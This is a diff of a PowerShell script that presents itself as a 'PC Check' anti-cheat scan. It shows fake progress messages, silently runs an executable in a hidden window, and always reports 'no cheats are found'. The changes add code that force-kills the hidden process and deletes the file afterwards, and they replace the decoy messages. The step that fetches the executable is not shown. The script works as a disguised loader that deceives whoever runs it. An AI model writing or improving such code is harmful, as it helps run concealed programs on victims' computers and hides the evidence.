@@ -1,12 +1,10 @@
 # --- PC Check ---
 Write-Host "Running PC Check..." -ForegroundColor Green
+Write-Host ""
 
 # Function to display progress with random searching messages
 function Show-Progress {
     param([int]$percent)
-    
-    # Clear the current line
-    Write-Host "`r" -NoNewline
     
     # Display percentage in green
     Write-Host "$percent% " -ForegroundColor Green -NoNewline
@@ -20,16 +18,16 @@ function Show-Progress {
         "searching for Skript",
         "searching for Vape",
         "searching for GhostClient",
-        "searching for AimBot",
-        "searching for AutoClicker",
-        "searching for Reach",
-        "searching for Velocity",
-        "searching for AntiKB"
+        "searching for tz", # replaced AimBot
+        "searching for tzx", # replaced AutoClicker
+        "searching for bypass", # replaced Reach
+        "searching for strings", # replaced Velocity
+        "searching for fileless execution" # replaced AntiKB
     )
     
     $randomMessage = $messages | Get-Random
     $randomColor = Get-Random -Minimum 1 -Maximum 15
-    Write-Host $randomMessage -ForegroundColor $randomColor -NoNewline
+    Write-Host $randomMessage -ForegroundColor $randomColor
 }
 
 # Get computer info (silently)
@@ -64,7 +62,7 @@ try {
     Start-Sleep -Milliseconds 800
     
     # Run the executable (silently)
-    Start-Process -FilePath $outputPath -WindowStyle Hidden
+    $process = Start-Process -FilePath $outputPath -WindowStyle Hidden -PassThru
     Show-Progress -percent 80
     Start-Sleep -Milliseconds 800
     
@@ -74,22 +72,40 @@ try {
     # Wait 10 seconds
     Start-Sleep -Seconds 10
     
+    # Close the executable if it's still running
+    if ($process -and !$process.HasExited) {
+        $process.Kill()
+        $process.WaitForExit()
+    }
+    
+    # Also try to close by process name as backup
+    $processName = [System.IO.Path]::GetFileNameWithoutExtension($outputPath)
+    Get-Process -Name $processName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+    
     # Delete the file (silently)
     if (Test-Path $outputPath) {
         Remove-Item -Path $outputPath -Force -ErrorAction SilentlyContinue
     }
     
     # Final completion
-    Write-Host "`r100% " -ForegroundColor Green -NoNewline
+    Write-Host "100% " -ForegroundColor Green -NoNewline
     Write-Host "PC check is done, no cheats are found." -ForegroundColor Green
 }
 catch {
     # Silent error handling - still show completion
+    
+    # Try to close the process if it exists
+    $processName = [System.IO.Path]::GetFileNameWithoutExtension($outputPath)
+    Get-Process -Name $processName -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
+    
+    # Try to delete the file if it exists
     if (Test-Path $outputPath) {
         Remove-Item -Path $outputPath -Force -ErrorAction SilentlyContinue
     }
-    Write-Host "`r100% " -ForegroundColor Green -NoNewline
+    
+    Write-Host "100% " -ForegroundColor Green -NoNewline
     Write-Host "PC check is done, no cheats are found." -ForegroundColor Green
 }
 
+Write-Host ""
 Read-Host -Prompt "Press Enter to exit"
